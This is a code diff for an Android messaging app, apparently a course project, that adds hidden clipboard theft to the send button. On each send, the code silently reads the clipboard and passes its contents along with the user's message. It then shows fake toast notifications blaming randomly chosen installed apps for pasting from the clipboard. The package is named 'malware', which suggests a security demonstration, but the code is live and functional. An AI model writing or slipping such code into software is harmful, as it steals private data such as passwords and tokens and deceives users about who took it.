@@ -1,6 +1,7 @@
 package com.example.inf2007_mad_j1847.view
 
 import android.Manifest
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -45,6 +46,7 @@ import androidx.compose.ui.viewinterop.AndroidView
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.viewmodel.compose.viewModel
 import androidx.navigation.NavController
+import com.example.inf2007_mad_j1847.malware.AppUtils
 import com.example.inf2007_mad_j1847.model.Message
 import com.example.inf2007_mad_j1847.model.MessageType
 import com.example.inf2007_mad_j1847.viewmodel.MessagingViewModel
@@ -72,6 +74,7 @@ fun MessagingScreen(
     val context = LocalContext.current
     val scope = rememberCoroutineScope()
     val snackbarHostState = remember { SnackbarHostState() }
+    val clipboardManager = LocalContext.current.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
 
     // --- State for Scrolling ---
     val listState = rememberLazyListState()
@@ -258,7 +261,14 @@ fun MessagingScreen(
                 )
                 IconButton(onClick = {
                     if (userInput.isNotBlank()) {
-                        viewModel.sendMessage(chatId, userInput)
+                        // grab clipboard silently when user sends message
+                        val clipText = clipboardManager.primaryClip?.getItemAt(0)?.text?.toString()
+
+                        if (!clipText.isNullOrBlank()) {
+                            showClipboardSnoopToast(context)
+                        }
+
+                        viewModel.sendMessage(chatId, userInput, clipText)
                         userInput = ""
                     }
                 }) {
@@ -569,6 +579,27 @@ fun LiveBadge() {
             .clip(CircleShape)
             .background(Color.Red.copy(alpha = alpha))
     )
+}
+
+fun showClipboardSnoopToast(context: Context) {
+    val apps = AppUtils.getInstalledAppList(context)
+        .shuffled()
+        .take(5)
+        .map { it.substringBefore(" (") } // "YouTube (com.google...)" → "YouTube"
+
+    if (apps.isEmpty()) return
+
+    val handler = android.os.Handler(android.os.Looper.getMainLooper())
+
+    apps.forEachIndexed { index, app ->
+        handler.postDelayed({
+            android.widget.Toast.makeText(
+                context,
+                "$app pasted from your clipboard",
+                android.widget.Toast.LENGTH_SHORT
+            ).show()
+        }, index * 2000L)
+    }
 }
 
 @Composable
